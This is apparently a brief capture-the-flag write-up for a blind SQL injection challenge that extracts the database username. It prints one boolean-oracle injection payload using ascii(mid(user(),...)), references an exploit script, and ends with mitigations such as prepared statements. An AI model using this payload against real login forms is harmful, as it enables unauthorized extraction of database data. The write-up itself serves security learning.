# db_user

**Category:** Blind SQL Injection

## Vulnerability
Same boolean oracle technique as db_name, targeting the `user()` SQL function instead.

## Approach
```
' OR id=1 AND ascii(mid(user(),{i},1))={ord(c)} #
```
Extracted the full database username. Flag formed by removing the first character.

## Exploit
See [blind_sqli.py](./blind_sqli.py)

## Mitigation
- Prepared statements
- Restrict DB user privileges to minimum required
- Rate limiting on login
